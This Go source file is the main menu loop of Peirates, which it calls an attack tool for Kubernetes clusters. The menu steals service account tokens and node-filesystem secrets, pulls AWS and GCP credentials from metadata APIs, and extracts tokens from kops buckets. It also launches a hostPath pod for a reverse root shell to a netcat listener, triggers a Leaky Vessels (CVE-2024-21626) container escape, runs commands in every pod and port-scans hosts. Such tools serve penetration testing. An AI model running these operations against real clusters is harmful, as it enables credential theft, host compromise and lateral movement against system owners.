package peirates

// Peirates - an Attack tool for Kubernetes clusters

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"

	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
)

// Verbosity mode - if set to true, DEBUG messages will be printed to STDOUT.
var Verbose bool

// If this option is on, kubectl commands will be preceded with an auth can-i
// check. Note that this only checks against RBAC, such that admission
// controllers can still block an action that RBAC permits.
var UseAuthCanI bool = true

//------------------------------------------------------------------------------------------------------------------------------------------------

// Main starts Peirates
func Main() {
	// Peirates version string
	var version = "1.1.17"

	var err error

	// Menu detail level
	// - true: the "full" menu that Peirates had classically
	// - false: a shorter menu of options - all options still work, but not all are shown
	var fullMenu bool = true

	// AWS credentials currently in use.
	var awsCredentials AWSCredentials

	// Make room for an assumed role.
	var assumedAWSrole AWSCredentials

	detectCloud := populateAndCheckCloudProviders()

	// Create a global variable named "connectionString" initialized to default values
	connectionString := ImportPodServiceAccountToken()
	cmdOpts := CommandLineOptions{connectionConfig: &connectionString}

	// the interactive boolean tracks whether the user is running peirates in menu mode (true)
	// or in command-line mode (false)

	interactive := true

	var podInfo PodDetails

	// Run the option parser to initialize connectionStrings
	parseOptions(&cmdOpts)

	// Check whether the -m / --module flag has been used to run just a specific module instead
	// of the menu.
	if cmdOpts.moduleToRun != "" {
		interactive = false
	}

	// List of service accounts gathered so far
	var serviceAccounts []ServiceAccount
	if len(connectionString.TokenName) > 0 {
		AddNewServiceAccount(connectionString.TokenName, connectionString.Token, "Loaded at startup", &serviceAccounts)
	}

	// List of current client cert/key pairs
	clientCertificates := []ClientCertificateKeyPair{}

	// print the banner, so that any node credentials pulled are not out of place.
	printBanner(interactive, version)

	// Add the kubelet kubeconfig and authentication information if available.
	err = checkForNodeCredentials(&clientCertificates)
	if err != nil {
		println("Problem with credentials: %v", err)
	}
	// If there are client certs, but no service accounts, switch to the first client cert
	if (len(serviceAccounts) == 0) && (len(clientCertificates) > 0) {
		assignAuthenticationCertificateAndKeyToConnection(clientCertificates[0], &connectionString)
	}

	// Add the service account tokens for any pods found in /var/lib/kubelet/pods/.
	gatherPodCredentials(&serviceAccounts, interactive, false)

	// Check environment variables - see KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT
	// Watch the documentation on these variables for changes:
	// https://kubernetes.io/docs/concepts/containers/container-environment-variables/

	// Read AWS credentials from environment variables if present.
	awsCredentials = PullIamCredentialsFromEnvironmentVariables()

	// Collect the pod IP address if we are in a pod or on a node that has an eth0 interface.
	eth0IP, err := GetMyIPAddress("eth0")
	if err != nil {
		eth0IP = ""
	}

	var input int
	for ok := true; ok; ok = (input != 2) {
		banner(connectionString, detectCloud, eth0IP, awsCredentials, assumedAWSrole)

		var input string
		var userResponse string
		err := errors.New("empty")

		if interactive {
			printMenu(fullMenu)

			input, err = ReadLineStripWhitespace()
			if err != nil {
				continue
			}
		} else {
			fmt.Println("----------------------------------------------------------------")
			input = cmdOpts.moduleToRun
			fmt.Printf("\nAttempting menu option %s\n\n", input)
		}

		////////////////////////////////////////////////////////////////////////////////
		// REFACTOR ADVICE: Make these next few use a loop with items like this:
		//
		//                  items["kubectl "] = &handleKubectlSpace()
		////////////////////////////////////////////////////////////////////////////////

		// Handle kubectl commands before the switch menu.
		const kubectlSpace = "kubectl "
		if strings.HasPrefix(input, kubectlSpace) {

			// remove the kubectl, then split the rest on whitespace
			argumentsLine := strings.TrimPrefix(input, kubectlSpace)
			arguments := strings.Fields(argumentsLine)

			kubectlOutput, _, err := runKubectlSimple(connectionString, arguments...)
			println(string(kubectlOutput))

			// Note that we got an error code, in case it's the only output.
			if err != nil {
				println("[-] error returned running: ", input)
			}

			// Make sure not to go into the switch-case
			pauseToHitEnter(interactive)
			continue
		}

		// Handle kubectl-try-all requests
		const kubectlTryAllSpace = "kubectl-try-all "
		if strings.HasPrefix(input, kubectlTryAllSpace) {

			// remove the kubectl-try-all, then split the rest on whitespace
			argumentsLine := strings.TrimPrefix(input, kubectlTryAllSpace)
			arguments := strings.Fields(argumentsLine)

			_, _, err := attemptEveryAccount(false, &connectionString, &serviceAccounts, &clientCertificates, arguments...)

			// Note that we got an error code, in case it's the only output.
			if err != nil {
				println("[-] Could not perform action or received an error on: ", input)
			}

			// Make sure not to go into the switch-case
			pauseToHitEnter(interactive)
			continue
		}

		// Handle kubectl-try-all-until-success requests
		const kubectlTryAllUntilSuccessSpace = "kubectl-try-all-until-success "
		if strings.HasPrefix(input, kubectlTryAllUntilSuccessSpace) {

			// remove the kubectl-try-all, then split the rest on whitespace
			argumentsLine := strings.TrimPrefix(input, kubectlTryAllUntilSuccessSpace)
			arguments := strings.Fields(argumentsLine)

			_, _, err := attemptEveryAccount(true, &connectionString, &serviceAccounts, &clientCertificates, arguments...)

			// Note that we got an error code, in case it's the only output.
			if err != nil {
				println("[-] Could not perform action or received an error on: ", input)
			}

			// Make sure not to go into the switch-case
			pauseToHitEnter(interactive)
			continue
		}

		// Handle shell commands before the switch menu
		const shellSpace = "shell "
		const shell = "shell"
		// Handle when the user doesn't know to put a command after "shell"
		if input == shell {
			println("Enter a command or type 'exit'")
			input, err = ReadLineStripWhitespace()
			if err != nil {
				println("error in reading input" + err.Error())
				continue
			}
			input = shellSpace + input
		}

		if strings.HasPrefix(input, shellSpace) {

			// trim the newline, remove the shell, then split the rest on whitespace
			input = strings.TrimSuffix(input, "\n")

			for input != "" && input != "exit" {
				argumentsLine := strings.TrimPrefix(input, shellSpace)
				spaceDelimitedSet := strings.Fields(argumentsLine)

				// pop the first item so we can pass it in separately
				command, arguments := spaceDelimitedSet[0], spaceDelimitedSet[1:]

				/* #gosec G204 - this code is intended to run arbitrary commands for the user */
				cmd := exec.Command(command, arguments...)
				out, err := cmd.CombinedOutput()
				fmt.Printf("\n%s\n", string(out))
				if err != nil {
					println("running command failed with " + err.Error())
				}
				println("Enter another command or type 'exit'")
				input, err = ReadLineStripWhitespace()
				if err != nil {
					println("error in reading input")
					input = "exit"
				}
			}

			// Make sure not to go into the switch-case
			continue
		}

		const curlSpace = "curl "
		if strings.HasPrefix(input, curlSpace) {
			// remove the curl, then split the rest on whitespace
			argumentsLine := strings.TrimPrefix(input, curlSpace)
			arguments := strings.Fields(argumentsLine)

			// Pass the arguments to the curlNonWizard to construct a request object.
			request, https, ignoreTLSErrors, caCertPath, err := curlNonWizard(arguments...)
			if err != nil {
				println("Could not create request.")
				break
			}
			responseBody, err := DoHTTPRequestAndGetBody(request, https, ignoreTLSErrors, caCertPath)
			responseBodyString := string(responseBody)
			println(responseBodyString + "\n")

			if err != nil {
				println("Request produced an error.")
				break
			}
			pauseToHitEnter(interactive)
			continue
		}

		// Handle enumerate-dns before the interactive menu
		// const enumerateDNS = "enumerate-dns"
		// if strings.HasPrefix(input, enumerateDNS) {
		// 	// Run the DNS enumeration
		// 	enumerateDNS()
		// 	pauseToHitEnter(interactive)
		// 	continue
		// }

		// Peirates MAIN MENU
		switch input {

		// exit
		case "exit", "quit":
			os.Exit(0)

		//	[0] Run a kubectl command in the current namespace, API server and service account context
		case "0", "90", "kubectl":
			err = kubectl_interactive(connectionString)
			if err != nil {
				println("[-] Error running kubectl: ", err)
			}

		//	[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa, switchsa)
		case "switchsa", "saswitch", "switch-sa", "sa-switch":
			switchServiceAccounts(serviceAccounts, &connectionString)
		case "listsa", "list-sa", "salist", "sa-list":
			listServiceAccounts(serviceAccounts, connectionString)
		case "1", "sa-menu", "service-account-menu", "sa", "service-account":
			println("Current primary service account: ", connectionString.TokenName)
			println("\n")
			println("[1] List service accounts [list]")
			println("[2] Switch primary service account [switch]")
			println("[3] Enter new service account JWT [add]")
			println("[4] Export service accounts to JSON [export]")
			println("[5] Import service accounts from JSON [import]")
			println("[6] Decode a stored or entered service account token (JWT) [decode]")
			println("[7] Display a stored service account token in its raw form [display]")

			println("\n")

			_, err = fmt.Scanln(&input)
			switch strings.ToLower(input) {
			case "1", "list":
				listServiceAccounts(serviceAccounts, connectionString)
			case "2", "switch":
				switchServiceAccounts(serviceAccounts, &connectionString)
			case "3", "add":
				serviceAccount := acceptServiceAccountFromUser()
				serviceAccounts = append(serviceAccounts, serviceAccount)

				println()
				println("[1] Switch to this service account")
				println("[2] Maintain current service account")
				_, err = fmt.Scanln(&input)
				if err != nil {
					fmt.Printf("Error reading input: %s\n", err.Error())
					break
				}

				switch input {
				case "1":
					assignServiceAccountToConnection(serviceAccount, &connectionString)

				case "2":
					break
				default:
					println("Input not understood - adding service account but not switching context")
				}
				println("")
			case "4", "import":
				serviceAccountJSON, err := json.Marshal(serviceAccounts)
				if err != nil {
					fmt.Printf("[-] Error exporting service accounts: %s\n", err.Error())
				} else {
					println(string(serviceAccountJSON))
				}
			case "5", "export":
				var newserviceAccounts []ServiceAccount
				err := json.NewDecoder(os.Stdin).Decode(&newserviceAccounts)
				if err != nil {
					fmt.Printf("[-] Error importing service accounts: %s\n", err.Error())
				} else {
					serviceAccounts = append(serviceAccounts, newserviceAccounts...)
					fmt.Printf("[+] Successfully imported service accounts\n")
				}
			case "6", "decode":
				var token string
				println("\n1) Decode a JWT entered via a string.")
				println("2) Decode a service account token stored here.")
				println("Peirates:># ")
				_, err = fmt.Scanln(&input)

				switch input {
				case "1":
					println("\nEnter a JWT: ")
					_, err = fmt.Scanln(&token)
					printJWT(token)
				case "2":
					println("\nAvailable Service Accounts:")
					for i, account := range serviceAccounts {
						if account.Name == connectionString.TokenName {
							fmt.Printf("> [%d] %s\n", i, account.Name)
						} else {
							fmt.Printf("  [%d] %s\n", i, account.Name)
						}
					}
					println("\nEnter service account number or exit to abort: ")
					var tokNum int
					_, err = fmt.Scanln(&input)
					if input == "exit" {
						break
					}
					_, err := fmt.Sscan(input, &tokNum)
					if err != nil {
						fmt.Printf("Error parsing service account selection: %s\n", err.Error())
					} else if tokNum < 0 || tokNum >= len(serviceAccounts) {
						fmt.Printf("Service account %d does not exist!\n", tokNum)
					} else {
						printJWT(serviceAccounts[tokNum].Token)
					}
				}
			case "7", "display":
				displayServiceAccountTokenInteractive(serviceAccounts, &connectionString)

			}

		// [2] List and/or change namespaces [ns-menu] (try: listns, switchns)
		case "list-ns", "listns", "nslist", "ns-list":
			listNamespaces(connectionString)
		case "switch-ns", "switchns", "nsswitch", "ns-switch":
			menuSwitchNamespaces(&connectionString)
		case "2", "ns-menu", "namespace-menu", "ns", "namespace":
			println(`
			[1] List namespaces [list]
			[2] Switch namespace [switch]
			`)
			_, err = fmt.Scanln(&input)
			switch input {
			case "1", "list":
				listNamespaces(connectionString)

			case "2", "switch":
				menuSwitchNamespaces(&connectionString)

			default:
				break
			}

		// [3] Get list of pods
		case "3", "get-pods", "list-pods":
			println("\n[+] Printing a list of Pods in this namespace......")
			printListOfPods(connectionString)

		//[4] Get complete info on all pods (json)
		case "4", "dump-podinfo", "dump-pod-info":
			GetPodsInfo(connectionString, &podInfo)

		//	[6] Enter AWS IAM credentials manually [enter-aws-credentials]
		case "6", "enter-aws-credentials", "aws-creds":
			credentials, err := EnterIamCredentialsForAWS()
			if err != nil {
				break
			}

			awsCredentials = credentials
			println(" New AWS credentials are: \n")
			DisplayAWSIAMCredentials(awsCredentials)

		// [7] Attempt to Assume a Different AWS Role [aws-assume-role]
		case "7", "aws-assume-role":

			// Get role to assume
			var input string
			println("[+] Enter a role to assume, in the format arn:aws:iam::123456789012:role/roleName : ")
			_, err = fmt.Scanln(&input)

			iamArnValidationPattern := regexp.MustCompile(`arn:aws:iam::\d{12,}:\w+\/\w+`)
			if !iamArnValidationPattern.MatchString(input) {
				println("String entered isn't a AWS role name in the format requested.\n")
				break
			}
			roleToAssume := strings.TrimSpace(input)

			// Attempt to assume role.
			roleAssumption, err := AWSSTSAssumeRole(awsCredentials, roleToAssume)
			if err != nil {
				break
			}

			assumedAWSrole = roleAssumption

		// [8] Deactivate assumed AWS role [aws-empty-assumed-role]
		case "8", "aws-empty-assumed-role", "empty-aws-assumed-role":
			assumedAWSrole.AccessKeyId = ""
			assumedAWSrole.accountName = ""

		// [9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
		case "9", "cert-menu":
			println("Current certificate-based authentication: ", connectionString.ClientCertName)
			println("\n")
			println("[1] List client certificates [list]")
			println("[2] Switch active client certificates [switch]")
			// println("[3] Enter new client certificate and key [add]")
			// println("[4] Export service accounts to JSON [export]")
			// println("[5] Import service accounts from JSON [import]")
			// println("[6] Decode a stored or entered service account token (JWT) [decode]")

			println("\n")

			_, err = fmt.Scanln(&input)
			switch strings.ToLower(input) {
			case "1", "list":
				println("\nAvailable Client Certificate/Key Pairs:")
				for i, account := range clientCertificates {
					fmt.Printf("  [%d] %s\n", i, account.Name)
				}
			case "2", "switch":
				println("\nAvailable Client Certificate/Key Pairs:")
				for i, account := range clientCertificates {
					fmt.Printf("  [%d] %s\n", i, account.Name)
				}
				println("\nEnter certificate/key pair number or exit to abort: ")
				var tokNum int
				_, err = fmt.Scanln(&input)
				if input == "exit" {
					break
				}

				_, err := fmt.Sscan(input, &tokNum)
				if err != nil {
					fmt.Printf("Error parsing certificate/key pair selection: %s\n", err.Error())
				} else if tokNum < 0 || tokNum >= len(clientCertificates) {
					fmt.Printf("Certificate/key pair  %d does not exist!\n", tokNum)
				} else {
					assignAuthenticationCertificateAndKeyToConnection(clientCertificates[tokNum], &connectionString)
					fmt.Printf("Selected %s\n", connectionString.ClientCertName)
				}
			}

		//	[10] Get secrets from API server
		case "10", "list-secrets":
			secrets, serviceAccountTokens := getSecretList(connectionString)
			for _, secret := range secrets {
				println("[+] Secret found: ", secret)
			}
			for _, svcAcct := range serviceAccountTokens {
				println("[+] Service account found: ", svcAcct)
			}

		// [11] Get a service account token from a secret
		case "11", "get-secret", "secret-to-sa":
			println("\nPlease enter the name of the secret for which you'd like the contents: ")
			var secretName string
			_, err = fmt.Scanln(&secretName)

			if !kubectlAuthCanI(connectionString, "get", "secret") {
				println("[-] Permission Denied: your service account isn't allowed to get secrets")
				break
			}

			secretJSON, _, err := runKubectlSimple(connectionString, "get", "secret", secretName, "-o", "json")
			if err != nil {
				println("[-] Could not retrieve secret")
				break
			}

			var secretData map[string]interface{}
			err = json.Unmarshal(secretJSON, &secretData)

			secretType := secretData["type"].(string)

			/* #gosec G101 - this is not a hardcoded credential */
			if secretType != "kubernetes.io/service-account-token" {
				println("[-] This secret is not a service account token.")
				break
			}

			opaqueToken := secretData["data"].(map[string]interface{})["token"].(string)
			token, err := base64.StdEncoding.DecodeString(opaqueToken)
			if err != nil {
				println("[-] ERROR: couldn't decode")
			} else {
				fmt.Printf("[+] Saved %s // %s\n", secretName, token)
				AddNewServiceAccount(secretName, string(token), "Cluster Secret", &serviceAccounts)

			}

		// [5] Check all pods for volume mounts
		case "5", "find-volume-mounts", "find-mounts":
			println("[1] Get all host mount points [all]")
			println("[2] Get volume mount points for a specific pod [single]")
			println("\nPeirates:># ")
			_, err = fmt.Scanln(&input)

			GetPodsInfo(connectionString, &podInfo)

			switch input {
			case "1", "all":
				println("[+] Getting volume mounts for all pods")
				// BUG: Need to make it so this Get doesn't print all info even though it gathers all info.
				PrintHostMountPoints(podInfo)

				//MountRootFS(allPods, connectionString)
			case "2", "single":
				println("[+] Please provide the pod name: ")
				_, err = fmt.Scanln(&userResponse)
				fmt.Printf("[+] Printing volume mount points for %s\n", userResponse)
				PrintHostMountPointsForPod(podInfo, userResponse)
			}

		// [20] Gain a reverse rootshell by launching a hostPath / pod
		case "20", "attack-pod-hostpath-mount", "attack-hostpath-mount", "attack-pod-mount", "attack-hostmount-pod", "attack-mount-pod":
			allPods := getPodList(connectionString)

			// Before presenting all IP addresses, give the user the IP address for eth0 if available.
			eth0IP, err := GetMyIPAddress("eth0")
			if err != nil {
				fmt.Println("IP address for eth0 is ", eth0IP)
			}

			println("Your IP addresses: ")
			GetMyIPAddressesNative()

			println("What IP and Port will your netcat listener be listening on?")
			var ip, port string
			println("IP:")
			_, err = fmt.Scanln(&ip)
			if err != nil {
				println("[-] Error reading IP address.")
				break
			}
			println("Port:")
			_, err = fmt.Scanln(&port)
			if err != nil {
				println("[-] Error reading port.")
				break
			}
			MountRootFS(allPods, connectionString, ip, port)

		// [12] Request IAM credentials from AWS Metadata API [AWS only]
		case "12", "get-aws-token":
			// Pull IAM credentials from the Metadata API, store in a struct and display

			result, err := PullIamCredentialsFromAWS()
			if err != nil {
				println("[-] Operation failed.")
				break
			}

			awsCredentials = result
			DisplayAWSIAMCredentials(awsCredentials)

		// [13] Request IAM credentials from GCP Metadata API [GCP only]
		case "13", "get-gcp-token":

			// TODO: Store the GCP token and display, to bring this inline with the GCP functionality.

			// Make a request for a list of service account(s)
			var headers []HeaderLine
			headers = []HeaderLine{
				{"Metadata-Flavor", "Google"},
			}
			url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
			svcAcctListRaw, _ := GetRequest(url, headers, false)
			if (svcAcctListRaw == "") || (strings.HasPrefix(svcAcctListRaw, "ERROR:")) {
				break
			}

			// Parse the output service accounts into svcAcctListLines
			svcAcctListLines := strings.Split(string(svcAcctListRaw), "\n")

			// For each line found found, request a token corresponding to that line and print it.
			for _, line := range svcAcctListLines {

				if strings.TrimSpace(string(line)) == "" {
					continue
				}
				account := strings.TrimRight(string(line), "/")

				fmt.Printf("\n[+] GCP Credentials for account %s\n\n", account)
				token, _, err := GetGCPBearerTokenFromMetadataAPI(account)
				if err == nil {
					println(token)
				}
			}
			println(" ")

		// [14] Request kube-env from GCP Metadata API [GCP only]
		case "14", "attack-kube-env-gcp":
			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
			var headers []HeaderLine
			headers = []HeaderLine{
				{"Metadata-Flavor", "Google"},
			}
			kubeEnv, _ := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
			if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) {
				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
				// TODO: Should we get error code the way we used to:
				// fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
				break
			}
			kubeEnvLines := strings.Split(string(kubeEnv), "\n")
			for _, line := range kubeEnvLines {
				println(line)
			}

		// [15] Pull Kubernetes service account tokens from Kop's bucket in GCS [GCP only]
		case "15", "attack-kops-gcs-1":
			err := KopsAttackGCP(&serviceAccounts)
			if err != nil {
				println("Kops attack failed on GCP.")
			}
			pauseToHitEnter(interactive)

		// [16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
		case "16":
			err := KopsAttackAWS(&serviceAccounts, awsCredentials, assumedAWSrole)
			if err != nil {
				println("Attack failed on AWS.")
			}
			pauseToHitEnter(interactive)

		case "17", "aws-s3-ls", "aws-ls-s3", "ls-s3", "s3-ls":
			// [17] List AWS S3 Buckets accessible (Auto-Refreshing Metadata API credentials) [AWS]

			var credentialsToUse AWSCredentials
			if len(assumedAWSrole.AccessKeyId) > 0 {
				credentialsToUse = assumedAWSrole
			} else if len(awsCredentials.AccessKeyId) > 0 {
				credentialsToUse = awsCredentials
			} else {
				println("Pulling AWS credentials from the metadata API.")
				result, err := PullIamCredentialsFromAWS()
				if err != nil {
					println("[-] Could not get AWS credentials from metadata API.")
					break
				}
				println("[+] Got AWS credentials from metadata API.")
				awsCredentials = result
				credentialsToUse = awsCredentials
			}

			result, err := ListAWSBuckets(credentialsToUse)
			if err != nil {
				println("List bucket operation failed.")
				break
			}

			for _, bucket := range result {
				println(bucket)
			}

		case "18", "aws-s3-ls-objects", "aws-s3-list-objects", "aws-s3-list-bucket":
			// [18] List contents of an AWS S3 Bucket (Auto-Refreshing Metadata API credentials) [AWS]
			var bucket string

			println("Enter a bucket name to list: ")
			_, err = fmt.Scanln(&bucket)

			// Altering this to allow self-entered credentials.
			// var IAMCredentials = PullIamCredentialsFromAWS()
			if len(assumedAWSrole.AccessKeyId) > 0 {
				err = ListBucketObjects(assumedAWSrole, bucket)
			} else {
				err = ListBucketObjects(awsCredentials, bucket)
			}

		// [21] Run command in one or all pods in this namespace
		case "21", "exec-via-api":

			println("\n[1] Run command on a specific pod\n[2] Run command on all pods")
			_, err = fmt.Scanln(&input)
			println("[+] Please provide the command to run in the pods: ")

			commandToRunInPods, err := ReadLineStripWhitespace()
			if err != nil {
				println("Problem with stripping white space: %v", err)
			}

			switch input {
			case "1":
				println("[+] Enter the pod name in which to run the command: ")

				var podToRunIn string
				_, err = fmt.Scanln(&podToRunIn)
				if err != nil {
					println("Problem with reading pod name: %v", err)
					_, _ = fmt.Scanln(&input)
				}
				podsToRunTheCommandIn := []string{podToRunIn}

				if commandToRunInPods != "" {
					if len(podsToRunTheCommandIn) > 0 {
						execInListPods(connectionString, podsToRunTheCommandIn, commandToRunInPods)
					}
				}
			case "2":
				var input string
				if commandToRunInPods != "" {
					execInAllPods(connectionString, commandToRunInPods)
				} else {
					fmt.Print("[-] ERROR - command string was empty.")
					_, _ = fmt.Scanln(&input)
				}

			}
		// [22] Use the kubelet to gain the token in every pod where we can run a command
		case "22", "exec-via-kubelet", "exec-via-kubelets":
			ExecuteCodeOnKubelet(connectionString, &serviceAccounts)

		// [23] Use CVE-2024-21626 (Leaky Vessels) to get a shell on the host (runc versions <1.12) [leakyvessels] *
		case "23", "leakyvessels", "cve-2024-21626":
			_ = createLeakyVesselPod(connectionString)

		// [30] Steal secrets from the node filesystem [nodefs-steal-secrets]
		case "30", "nodefs-steal-secrets", "steal-nodefs-secrets":
			println("\nAttempting to steal secrets from the node filesystem - this will return no output if run in a container or if /var/lib/kubelet is inaccessible.\n")
			gatherPodCredentials(&serviceAccounts, true, true)

		// [31] List all secrets stolen from the node filesystem [nodefs-secrets-list]  (unimplemented)
		case "31", "nodefs-secrets-list", "list-nodefs-secrets":
			println("Item not yet implemented")
		// [89] Inject peirates into another pod via API Server [inject-and-exec]
		case "89", "inject-and-exec":

			println("\nThis item has been removed from the menu and is currently not supported.\n")
			println("\nChoose a pod to inject peirates into:\n")
			runningPods := getPodList(connectionString)
			for i, listpod := range runningPods {
				fmt.Printf("[%d] %s\n", i, listpod)
			}

			println("Enter the number of a pod to inject peirates into: ")

			var choice int
			_, err = fmt.Scanln(&choice)

			podName := runningPods[choice]

			injectIntoAPodViaAPIServer(connectionString, podName)

		// [91] Make an HTTP request (GET or POST) to a URL of your choice [curl]
		// This is available both on the main menu line and interactively.
		// Here's the interactive.
		case "91", "curl":
			println("[+] Enter a URL, including http:// or https:// - if parameters are required, you must provide them as part of the URL: ")
			fullURL, err := ReadLineStripWhitespace()
			if err != nil {
				println("Problem with reading URL: %v", err)
				break
			}
			fullURL = strings.ToLower(fullURL)

			// Make sure the URL begins with http:// or https://.
			if !strings.HasPrefix(fullURL, "http://") && !strings.HasPrefix(fullURL, "https://") {
				fmt.Println("This URL does not start with http:// or https://")
				break
			}

			// If the URL is https, ask more questions.
			https := false
			ignoreTLSErrors := false
			caCertPath := ""

			if strings.HasPrefix(fullURL, "https://") {
				https = true
				// Ask the user if they want to ignore certificate validation
				println("Would you like to ignore whether the server certificate is valid (y/n)? This corresponds to curl's -k flag.")
				answer, err := ReadLineStripWhitespace()
				if err != nil {
					println("Problem with stripping whitespace: %v", err)
				}
				answer = strings.ToLower(answer)
				if strings.HasPrefix(answer, "y") {
					ignoreTLSErrors = true
				}

				println("If you would like to set a custom certificate authority cert path, enter it here.  Otherwise, hit enter.")
				caCertPath, err = ReadLineStripWhitespace()
				if err != nil {
					println("Problem with stripping whitespace: %v", err)
					break
				}
			}

			// Get the HTTP method
			method := "--undefined--"
			for (method != "GET") && (method != "POST") {
				fmt.Println("[+] Enter method - only GET and POST are supported: ")
				input, err = ReadLineStripWhitespace()
				if err != nil {
					println("Problem with stripping whitespace: %v", err)
					break
				}
				method = strings.TrimSpace(strings.ToUpper(input))
			}

			// Store the headers in a list
			var headers []HeaderLine

			inputHeader := "undefined"

			fmt.Println("[+] Specify custom header lines, if desired, entering the Header name, hitting Enter, then the Header value.")
			for inputHeader != "" {
				// Request a header name

				fmt.Println("[+] Enter a header name or a blank line if done: ")
				input, err = ReadLineStripWhitespace()
				if err != nil {
					println("Problem with stripping whitespace: %v", err)
					break
				}

				inputHeader = strings.TrimSpace(input)

				if inputHeader != "" {
					// Remove trailing : if present
					inputHeader = strings.TrimSuffix(inputHeader, ":")

					// Request a header rhs (value)
					fmt.Println("[+] Enter a value for " + inputHeader + ":")
					input, err = ReadLineStripWhitespace()
					if err != nil {
						println("Problem with stripping whitespace: %v", err)
						break
					}

					// Add the header value to the list
					var header HeaderLine
					header.LHS = inputHeader
					header.RHS = input
					headers = append(headers, header)
				}

			}

			inputParameter := "--undefined--"

			// Store the parameters in a map
			params := map[string]string{}

			fmt.Printf("[+] Now enter parameters which will be placed into the query string or request body.\n\n")
			fmt.Printf("    If you set a Content-Type manually to something besides application/x-www-form-urlencoded, use the parameter name a line of text and leave the value blank.\n\n")

			for inputParameter != "" {
				// Request a parameter name

				fmt.Println("[+] Enter a parameter or a blank line to finish entering parameters: ")
				inputParameter, err = ReadLineStripWhitespace()
				if err != nil {
					println("Problem with stripping whitespace: %v", err)
					break
				}

				if inputParameter != "" {
					// Request a parameter value
					fmt.Println("[+] Enter a value for " + inputParameter + ": ")
					input, err = ReadLineStripWhitespace()
					if err != nil {
						println("Problem with stripping whitespace: %v", err)
						break
					}

					// Add the parameter pair to the list
					params[inputParameter] = url.QueryEscape(input)
				}

			}

			var paramLocation string
			if len(params) > 0 {
				for (paramLocation != "url") && (paramLocation != "body") {
					fmt.Println("\nWould you like to place parameters in the URL (like in a GET query) or in the body (like in a POST)\nurl or body: ")
					paramLocation, err = ReadLineStripWhitespace()
					if err != nil {
						println("Problem with stripping whitespace: %v", err)
						break
					}
					paramLocation = strings.ToLower(paramLocation)
				}
			}

			// Make the request and get the response.
			request, err := createHTTPrequest(method, fullURL, headers, paramLocation, params)
			if err != nil {
				println("Could not create request.")
				break
			}
			responseBody, err := DoHTTPRequestAndGetBody(request, https, ignoreTLSErrors, caCertPath)
			if err != nil {
				println("Request failed.")
				break
			}
			responseBodyString := string(responseBody)
			println(responseBodyString + "\n")
			pauseToHitEnter(interactive)

		// [92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
		case "92", "set-auth-can-i":
			// Toggle UseAuthCanI between true and false
			println("\nWhen Auth-Can-I is set to true, Peirates uses the kubectl auth can-i feature to determine if an action is permitted before taking it.")
			println("Toggle this to false if auth can-i results aren't accurate for this cluster.")
			println("Auth-Can-I is currently set to ", UseAuthCanI)
			println("\nPlease choose a new value for Auth-Can-I:")
			println("[true] Set peirates to check whether an action is permitted")
			println("[false] Set peirates to skip the auth can-i check")
			println("[exit] Leave the setting at its current value")

			println("\nChoice: ")

			_, err = fmt.Scanln(&input)
			if err != nil {
				println("Error reading input: %v", err)
				break
			}

			switch strings.ToLower(input) {
			case "exit":
				continue
			case "true", "1", "t":
				UseAuthCanI = true
			case "false", "0", "f":
				UseAuthCanI = false
			}
			// Skip the "press enter to continue"
			continue

		// [93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
		case "93", "tcpscan", "tcp scan", "portscan", "port scan":

			var matched bool

			for !matched {
				println("Enter an IP address to scan or hit enter to exit the portscan function: ")
				_, err = fmt.Scan(&input)
				if err != nil {
					println("Input error: %v", err)
					break
				}
				if input == "" {
					break
				}
				check_pattern_1, err := regexp.Match(`^\s*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s*$`, []byte(input))
				if err != nil {
					println("Error on regexp match against IP address pattern.")
					continue
				}
				if check_pattern_1 {
					// Scan an IP
					println("Scanning " + input)
					scan_controller(input)
					break
				} else {
					check_pattern_2, err := regexp.Match(`^\s*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(\/[0,1,2,3]?\d)\s*$`, []byte(input))
					if err != nil {
						println("Error on regexp match against ip/bits CIDR pattern.")
						continue
					}
					if check_pattern_2 {
						println("Hidden CIDR scan mode used - this may be slow or unpredictable")
						hostList := cidrHosts(input)
						for _, host := range hostList {
							println("Scanning " + host)
							scan_controller(host)
						}
						break
					} else {
						println("Error: input must match an IP address or a CIDR formatted network.")
						continue
					}

				}
			}

		case "94", "enumerate-dns":

			_ = enumerateDNS()

		case "full", "help":
			fullMenu = true
			// Skip the "press enter to continue"
			continue

		case "short", "minimal":
			fullMenu = false
			// Skip the "press enter to continue"
			continue

		default:
			fmt.Println("Command unrecognized.")
		}

		if !interactive {
			os.Exit(0)
		}
		clearScreen(interactive)
	}
}
